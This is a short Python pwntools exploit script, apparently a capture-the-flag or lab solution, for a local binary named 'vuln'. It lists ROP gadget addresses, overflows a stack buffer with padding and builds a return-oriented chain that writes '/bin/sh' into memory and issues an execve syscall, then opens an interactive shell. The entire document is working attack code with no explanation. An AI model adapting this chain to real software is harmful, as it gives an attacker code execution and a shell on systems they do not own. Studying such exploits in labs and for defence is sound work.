#coding=utf-8
from pwn import *

buf = 0x7fffffffe340
ret = 0x7fffffffe358
rdi = 0x7fffffffe341
vuln = 0x400b4d

# pop rbx ; ret
pop_rbx = 0x0000000000400d98
# pop rsi ; ret
pop_rsi = 0x00000000004100d3
# pop rdi ; ret
pop_rdi = 0x0000000000400686
# pop rax ; ret
pop_rax = 0x00000000004156f4
# pop rdx ; pop rsi ; ret
pop_rdx_rsi = 0x000000000044bf39
# mov rax, rdi ; ret
mov_rax_rdi = 0x0000000000412a53
# pop rdx ; ret
pop_rdx = 0x00000000004499b5
# add edi, dword ptr [rax + 4] ; jne 0x48e219 ; ret
add_edi_rax4 = 0x000000000048e1ee
# syscall
syscall = 0x000000000047b6ff
# add rax, 1 ; ret
add_rax_1 = 0x00000000004749c0
# mov qword ptr [rdi], rdx ; ret
mov_rdi_rdx = 0x0000000000435693

payload = 'a' * (ret - buf)
payload += p64(pop_rdx)
payload += p64(0x0068732f6e69622f)
payload += p64(mov_rdi_rdx)
payload += p64(pop_rdx)
payload += p64(0x0)
payload += p64(pop_rsi)
payload += p64(0x0)
payload += p64(pop_rax)
payload += p64(0x3b)
payload += p64(syscall)

p = process('./vuln')
p.sendline(payload)
p.interactive()
